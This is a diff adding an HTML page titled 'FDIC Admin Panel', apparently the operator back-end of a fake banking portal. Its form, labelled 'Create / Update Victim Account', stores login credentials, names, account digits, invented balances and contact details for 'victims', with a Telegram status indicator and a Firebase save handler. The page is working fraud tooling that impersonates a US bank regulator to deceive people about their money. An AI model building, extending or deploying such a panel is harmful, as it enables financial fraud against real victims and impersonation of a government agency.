@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FDIC Admin Panel</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="admin-header">
+    <h2>Admin Control Panel</h2>
+    <div>
+      <span class="telegram-status">Telegram: Connected</span>
+      <button onclick="app.handleLogout()" style="margin-left:10px; padding:5px 10px; background:#555; color:white; border:none; border-radius:4px; cursor:pointer;">Logout</button>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="card">
+      <h3>Create / Update Victim Account</h3>
+      <div class="admin-grid">
+        <div class="form-group">
+          <label>Username (for login)</label>
+          <input type="text" id="vUsername" placeholder="e.g. john_doe">
+        </div>
+        <div class="form-group">
+          <label>Password (for login)</label>
+          <input type="text" id="vPassword" placeholder="e.g. password123">
+        </div>
+        <div class="form-group">
+          <label>Full Name</label>
+          <input type="text" id="vName" placeholder="John Doe">
+        </div>
+        <div class="form-group">
+          <label>Account Number (Last 4 Digits)</label>
+          <input type="text" id="vLast4" placeholder="1234" maxlength="4">
+        </div>
+        <div class="form-group">
+          <label>Account Type</label>
+          <select id="vType">
+            <option value="checking">Checking</option>
+            <option value="savings">Savings</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Balance ($)</label>
+          <input type="number" id="vBalance" placeholder="23465.30" step="0.01">
+        </div>
+        <div class="form-group">
+          <label>Email</label>
+          <input type="email" id="vEmail" placeholder="john@example.com">
+        </div>
+        <div class="form-group">
+          <label>Phone</label>
+          <input type="text" id="vPhone" placeholder="(555) 123-4567">
+        </div>
+        <div class="form-group">
+          <label>Address</label>
+          <input type="text" id="vAddress" placeholder="123 Main St, City, ST">
+        </div>
+      </div>
+      <button class="admin-btn" id="saveBtn">Save Victim Data</button>
+    </div>
+
+    <div class="card">
+      <h3>Existing Victims</h3>
+      <p style="font-size:14px; color:#666;">Note: This feature requires iterating through the DB. For simplicity, use the form above to create/update. Delete functionality is advanced.</p>
+    </div>
+  </div>
+
+  <script type="module">
+    import { app } from "./app.js";
+    import { auth } from "./firebase-config.js";
+    import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+    // Protect Admin Page
+    onAuthStateChanged(auth, (user) => {
+      if (!user) {
+        window.location.href = "index.html";
+      }
+    });
+
+    // Save Button Logic
+    document.getElementById('saveBtn').addEventListener('click', async () => {
+      const username = document.getElementById('vUsername').value;
+      const password = document.getElementById('vPassword').value;
+      const name = document.getElementById('vName').value;
+      const last4 = document.getElementById('vLast4').value;
+      const type = document.getElementById('vType').value;
+      const balance = document.getElementById('vBalance').value;
+      const email = document.getElementById('vEmail').value;
+      const phone = document.getElementById('vPhone').value;
+      const address = document.getElementById('vAddress').value;
+
+      if (!username || !password || !name || !last4 || !balance) {
+        alert("Please fill in all required fields (Username, Password, Name, Last 4, Balance).");
+        return;
+      }
+
+      try {
+        await app.createVictimAccount(username, password, name, last4, type, balance, address, email, phone);
+        alert("Victim Account Created/Updated Successfully!");
+      } catch (err) {
+        alert("Error: " + err.message);
+      }
+    });
+  </script>
+</body>
+</html>
